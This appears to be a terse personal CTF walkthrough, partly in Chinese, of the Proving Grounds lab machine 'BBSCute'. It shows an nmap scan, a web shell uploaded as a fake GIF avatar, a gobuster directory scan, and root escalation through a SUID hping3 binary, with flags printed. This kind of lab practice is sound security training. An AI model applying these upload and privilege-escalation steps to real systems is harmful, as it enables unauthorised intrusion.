参考资料：  
[https://siunam321.github.io/ctf/pgplay/BBSCute/](https://siunam321.github.io/ctf/pgplay/BBSCute/)
 
[https://medium.com/@cyberarri/bbscute-pg-play-writeup-fd173dc37e6b](https://medium.com/@cyberarri/bbscute-pg-play-writeup-fd173dc37e6b)
      

saomiao  
┌──(kali㉿kali)-[~/Desktop/pg02/BBSCute]  
└─$ nmap -sS -sV 192.168.196.128  
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org) ) at 2025-11-16 01:28 EST  
Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan  
Service scan Timing: About 40.00% done; ETC: 01:28 (0:00:09 remaining)  
Nmap scan report for 192.168.196.128  
Host is up (0.092s latency).  
Not shown: 995 closed tcp ports (reset)  
PORT STATE SERVICE VERSION  
22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)  
80/tcp open http Apache httpd 2.4.38 ((Debian))  
88/tcp open http nginx 1.14.2  
110/tcp open pop3 Courier pop3d  
995/tcp open ssl/pop3 Courier pop3d  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .  
Nmap done: 1 IP address (1 host up) scanned in 9.43 seconds   ┌──(kali㉿kali)-[~/Desktop/pg02/BBSCute]  
└─$
   

rukoudian  
[http://192.168.196.128/index.php](http://192.168.196.128/index.php)
 
创建用户 test 上传shell
 
shell 内容  
GIF8;
 
[http://192.168.196.128/uploads/avatar_test_shell.php](http://192.168.196.128/uploads/avatar_test_shell.php)
 
[https://www.exploit-db.com/exploits/48800](https://www.exploit-db.com/exploits/48800) 这个不好使用 路径不对
    
mulu  
gobuster dir -u [http://192.168.196.128](http://192.168.196.128) -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -b 404,401 -x php,asp,js,txt,html
 
html local.txt  
www-data@cute:/var/www$ cat local.txt  
cat local.txt  
f65c15b6b217f44782f28175104ac393  
www-data@cute:/var/www$
   

提权：root 拿下最高权限 还有各种的限制 绕过极致
 
www-data@cute:/var/www$ /usr/bin/hping3  
/usr/bin/hping3  
bash: /usr/bin/hping3: No such file or directory  
www-data@cute:/var/www$ /usr/sbin/hping3  
/usr/sbin/hping3  
hping3\> /bin/bash -p  
/bin/bash -p  
bash-5.0# id  
id  
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)  
bash-5.0# cd /root  
cd /root  
bash-5.0# ls  
ls  
proof.txt root.txt  
bash-5.0# cat proof.txt  
cat proof.txt  
f449d5bba90d348491af99bbc7a03a01  
bash-5.0#